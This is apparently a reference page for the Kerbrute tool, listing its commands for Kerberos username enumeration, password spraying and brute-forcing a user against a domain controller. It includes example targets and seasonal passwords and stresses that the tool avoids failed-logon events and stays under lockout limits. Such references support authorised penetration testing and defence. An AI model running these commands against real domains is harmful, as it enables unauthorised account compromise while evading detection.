# Kerbrute

> A fast Go tool for Kerberos pre-authentication: username enumeration and password spraying against a domain controller, with no Windows event 4625 noise.

- Category: Active Directory
- Commands: 5
- Page: https://terminal.rokibulroni.com/tool/active-directory/kerbrute
- Homepage: https://github.com/ropnop/kerbrute
- Documentation: https://github.com/ropnop/kerbrute
- Tags: Active Directory, Kerberos, password spraying, enumeration

## Install

- go: `go install github.com/ropnop/kerbrute@latest`

## Enumeration

### kerbrute userenum -d <domain> --dc <dc-ip> <userlist>

```bash
kerbrute userenum -d <domain> --dc <dc-ip> <userlist>
```

Example:

```bash
kerbrute userenum -d corp.local --dc 10.10.10.1 users.txt
```

Validates which usernames exist by watching Kerberos pre-auth responses — quiet and does not lock accounts.


## Password attacks

### kerbrute passwordspray -d <domain> --dc <dc-ip> <userlist> <password>

```bash
kerbrute passwordspray -d <domain> --dc <dc-ip> <userlist> <password>
```

Example:

```bash
kerbrute passwordspray -d corp.local --dc 10.10.10.1 valid_users.txt Spring2026!
```

Tries one password against many users, staying under lockout thresholds.

### kerbrute bruteuser -d <domain> --dc <dc-ip> <passwordlist> <user>

```bash
kerbrute bruteuser -d <domain> --dc <dc-ip> <passwordlist> <user>
```

Example:

```bash
kerbrute bruteuser -d corp.local --dc 10.10.10.1 passwords.txt admin
```

Tries many passwords against one user (watch the lockout policy).

### kerbrute passwordspray -d <domain> --dc <dc-ip> --safe <userlist> <password>

```bash
kerbrute passwordspray -d <domain> --dc <dc-ip> --safe <userlist> <password>
```

Example:

```bash
kerbrute passwordspray -d corp.local --dc 10.10.10.1 --safe users.txt Winter2026
```

Stops immediately if any account shows signs of being locked.


## Output

### kerbrute userenum -d <domain> --dc <dc-ip> <userlist> -o <file>

```bash
kerbrute userenum -d <domain> --dc <dc-ip> <userlist> -o <file>
```

Example:

```bash
kerbrute userenum -d corp.local --dc 10.10.10.1 users.txt -o valid.txt
```

Writes valid results to a file for the next stage.

## Related tools

- [Impacket](https://terminal.rokibulroni.com/tool/active-directory/impacket)
- [CrackMapExec / NetExec](https://terminal.rokibulroni.com/tool/lateral/crackmapexec)
- [Hydra](https://terminal.rokibulroni.com/tool/credentials/hydra)
